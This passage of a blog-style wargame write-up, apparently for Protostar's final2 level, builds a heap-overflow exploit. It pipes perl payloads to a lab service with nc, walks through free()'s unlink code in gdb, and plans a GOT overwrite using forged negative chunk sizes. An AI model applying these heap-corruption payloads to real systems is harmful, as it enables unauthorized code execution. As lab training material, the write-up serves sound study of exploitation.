<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span>perl -e <span class="s1">&#39;print(FSRD.Ax123 ./.FSRDROOT.Bx111 ./CCCCDDDD)&#39;</span> <span class="p">|</span> nc 192.168.1.6 2993
</code></pre></div>


<p>With the above input, the service segfaults during free().
Let&rsquo;s take a look at the memory to verify the overwrite of <em>size</em> and <em>prev_size</em>.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">34</span><span class="n">x</span> <span class="mh">0x0804E008</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804e000</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000089</span>      <span class="mh">0x44525346</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e010</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e020</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e030</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e040</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e050</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e060</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e070</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
<span class="mh">0x804e080</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x2f414141</span>
<span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">34</span><span class="n">x</span> <span class="mh">0x0804E090</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804e088</span><span class="o">:</span>      <span class="mh">0x43434343</span>      <span class="mh">0x44444444</span>      <span class="mh">0x44525346</span>      <span class="mh">0x544f4f52</span>
<span class="mh">0x804e098</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804e0a8</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804e0b8</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804e0c8</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804e0d8</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804e0e8</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804e0f8</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x2f424242</span>
<span class="mh">0x804e108</span><span class="o">:</span>      <span class="mh">0x43434343</span>      <span class="mh">0x44444444</span>
</code></pre></div>


<p>So the write succeeds.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">regs</span><span class="p">]</span>
  <span class="nl">EAX</span><span class="p">:</span> <span class="mh">0x42424242</span>  <span class="nl">EBX</span><span class="p">:</span> <span class="mh">0xB7FD7FF4</span>  <span class="nl">ECX</span><span class="p">:</span> <span class="mh">0x0804C2D6</span>  <span class="nl">EDX</span><span class="p">:</span> <span class="mh">0x43434343</span>  <span class="n">o</span> <span class="n">d</span> <span class="n">I</span> <span class="n">t</span> <span class="n">s</span> <span class="n">Z</span> <span class="n">a</span> <span class="n">P</span> <span class="n">c</span>
  <span class="nl">ESI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBP</span><span class="p">:</span> <span class="mh">0xBFFFF828</span>  <span class="nl">ESP</span><span class="p">:</span> <span class="mh">0xBFFFF7E0</span>  <span class="nl">EIP</span><span class="p">:</span> <span class="mh">0x0804AAEF</span>
  <span class="nl">CS</span><span class="p">:</span> <span class="mo">0073</span>  <span class="nl">DS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">ES</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">FS</span><span class="p">:</span> <span class="mo">0000</span>  <span class="nl">GS</span><span class="p">:</span> <span class="mo">0033</span>  <span class="nl">SS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">code</span><span class="p">]</span>
<span class="mh">0x804aaef</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">301</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="n">edx</span>
<span class="mh">0x804aaf2</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">304</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">]</span>
<span class="mh">0x804aaf5</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">307</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">]</span>
<span class="mh">0x804aaf8</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">310</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">edx</span>
<span class="mh">0x804aafb</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">313</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>
<span class="mh">0x804aafe</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">316</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x30</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x804ab01</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">319</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x38</span><span class="p">]</span>
<span class="mh">0x804ab04</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">322</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x34</span>
<span class="o">--------------------------------------------------------------------------------</span>
<span class="mh">0x0804aaef</span> <span class="n">in</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804e008</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3648</span>
<span class="mi">3648</span>    <span class="n">final2</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
        <span class="n">in</span> <span class="n">final2</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
<span class="n">gdb</span><span class="err">$</span> <span class="n">i</span> <span class="n">r</span>  
<span class="n">eax</span>            <span class="mh">0x42424242</span>       <span class="mh">0x42424242</span>
<span class="n">edx</span>            <span class="mh">0x43434343</span>       <span class="mh">0x43434343</span>
</code></pre></div>


<p>And free() crashes as expected, because of the illegal chunk sizes.</p>

<p>So in order to exploit this vulnerability we have to put some more work into this.
Let&rsquo;s take a look at the free function to better understand what&rsquo;s happening.</p>

<h2 id="excursion-into-free">Excursion into free</h2>

<p>Let&rsquo;s step into free and see what&rsquo;s happening.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804a9cf</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0x0</span>
<span class="mh">0x804a9d3</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x804ac27</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">613</span><span class="o">&gt;</span>
</code></pre></div>


<p>First, check for a NULL pointer and immediatly return.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804a9d9</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
<span class="mh">0x804a9dc</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span>
<span class="mh">0x804a9df</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x34</span><span class="p">],</span><span class="n">eax</span>
</code></pre></div>


<p>Store the start of the current chunk in a local variable.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804aa37</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x34</span><span class="p">]</span>  <span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">chunk</span>
<span class="mh">0x804aa3a</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">120</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>   <span class="p">;</span> <span class="n">size</span> <span class="n">of</span> <span class="n">chunk</span>
<span class="mh">0x804aa3d</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">123</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x2</span>
<span class="mh">0x804aa40</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">126</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
<span class="mh">0x804aa42</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x804abca</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">520</span><span class="o">&gt;</span>
</code></pre></div>


<p>Here the <em>IS_MMAPPED</em> flag is check.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804aa54</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">146</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">]</span>  <span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aa57</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>   <span class="p">;</span> <span class="n">size</span> <span class="n">of</span> <span class="n">chunk</span>
<span class="mh">0x804aa5a</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">152</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xfffffffc</span>            <span class="p">;</span> <span class="n">mask</span> <span class="n">out</span> <span class="n">flags</span> <span class="n">from</span> <span class="n">size</span>
<span class="mh">0x804aa5d</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">155</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">],</span><span class="n">eax</span>
</code></pre></div>


<p>This piece of code stores the size of the next chunk on the stack.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804aa60</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">158</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x34</span><span class="p">]</span>  <span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">chunk</span>
<span class="mh">0x804aa63</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>   <span class="p">;</span> <span class="n">size</span> <span class="n">of</span> <span class="n">chunk</span>
<span class="mh">0x804aa66</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">164</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>
<span class="mh">0x804aa69</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">167</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
<span class="mh">0x804aa6b</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">169</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x804aaa7</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">229</span><span class="o">&gt;</span>
</code></pre></div>


<p>Next the <em>PREV_INUSE</em> is checked.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804aaaa</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">232</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x2c</span><span class="p">]</span>
<span class="mh">0x804aaad</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">235</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">]</span> <span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aab0</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">238</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x804ab54</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">402</span><span class="o">&gt;</span>
</code></pre></div>


<p>Dunno, probably verifies the calculated start of next chunk.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804aab6</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">244</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span> <span class="p">;</span> <span class="n">size</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aab9</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">247</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">]</span> <span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aabc</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">250</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">edx</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="mi">1</span><span class="p">]</span>          <span class="p">;</span> <span class="n">next_next</span> <span class="n">chunk</span>
<span class="mh">0x804aabf</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">253</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>  <span class="p">;</span> <span class="n">size</span> <span class="n">of</span> <span class="n">next_next</span> <span class="n">chunk</span>
<span class="mh">0x804aac2</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">256</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>
<span class="mh">0x804aac5</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">259</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">],</span><span class="n">eax</span>
<span class="p">...</span>
<span class="mh">0x804aad1</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">271</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">],</span><span class="mh">0x0</span>
<span class="mh">0x804aad5</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">275</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x804ab01</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">319</span><span class="o">&gt;</span>
</code></pre></div>


<p>Here the <em>PREV_INUSE</em> flag of the next_next chunk is checked.
Afterwards the FD and BK pointers of the next chunk are written to their counterparts.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x804aad7</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">277</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">]</span> <span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aada</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">280</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>  <span class="p">;</span> <span class="n">FD</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aadd</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">283</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x804aae0</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">286</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">]</span> <span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aae3</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">289</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>  <span class="p">;</span> <span class="n">BK</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aae6</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">292</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x804aae9</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">295</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">]</span> <span class="p">;</span> <span class="n">FD</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aaec</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">298</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">]</span> <span class="p">;</span> <span class="n">BK</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aaef</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">301</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="n">edx</span>
<span class="mh">0x804aaf2</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">304</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">]</span> <span class="p">;</span> <span class="n">BK</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aaf5</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">307</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">]</span> <span class="p">;</span> <span class="n">FD</span> <span class="n">of</span> <span class="n">next</span> <span class="n">chunk</span>
<span class="mh">0x804aaf8</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">310</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">edx</span>
</code></pre></div>


<p>If we can execute this code path, we can overwrite a pointer in e.g. the GOT.
In order to do this, the next_next chunk must have a PREV_INUSE flag of zero.</p>

<p>In this example we control the next chunk header.
We only need to introduce a next_next chunk with above mentioned flag set.
With a negative size for the next chunk we avoid null bytes and can create a virtual chunk in the first part of the input.</p>

<h2 id="exploitation-4">Exploitation</h2>

<p>Let&rsquo;s test the approach with the following code.
Let&rsquo;s just try with the payload from Heap3.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span>perl -e <span class="s1">&#39;print(&quot;FSRD&quot;.&quot;A&quot;x123 .&quot;/&quot;.&quot;FSRDROOT&quot;.&quot;B&quot;x103 .&quot;/\xFC\xFF\xFF\xFF\xFC\xFF\xFF\xFFCCCCDDDD&quot;)&#39;</span> <span class="p">|</span> nc 192.168.1.6 2993
</code></pre></div>


<p>With this input we expect a segmentation fault when the second chunk is free()d.
Let&rsquo;s see what gdb says.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">regs</span><span class="p">]</span>
  <span class="nl">EAX</span><span class="p">:</span> <span class="mh">0x43434343</span>  <span class="nl">EBX</span><span class="p">:</span> <span class="mh">0xB7FD7FF4</span>  <span class="nl">ECX</span><span class="p">:</span> <span class="mh">0x0804C2D6</span>  <span class="nl">EDX</span><span class="p">:</span> <span class="mh">0x44444444</span>  <span class="n">o</span> <span class="n">d</span> <span class="n">I</span> <span class="n">t</span> <span class="n">s</span> <span class="n">Z</span> <span class="n">a</span> <span class="n">P</span> <span class="n">c</span>
  <span class="nl">ESI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBP</span><span class="p">:</span> <span class="mh">0xBFFFF248</span>  <span class="nl">ESP</span><span class="p">:</span> <span class="mh">0xBFFFF200</span>  <span class="nl">EIP</span><span class="p">:</span> <span class="mh">0x0804AAEF</span>
  <span class="nl">CS</span><span class="p">:</span> <span class="mo">0073</span>  <span class="nl">DS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">ES</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">FS</span><span class="p">:</span> <span class="mo">0000</span>  <span class="nl">GS</span><span class="p">:</span> <span class="mo">0033</span>  <span class="nl">SS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">code</span><span class="p">]</span>
<span class="mh">0x804aaef</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">301</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="n">edx</span>
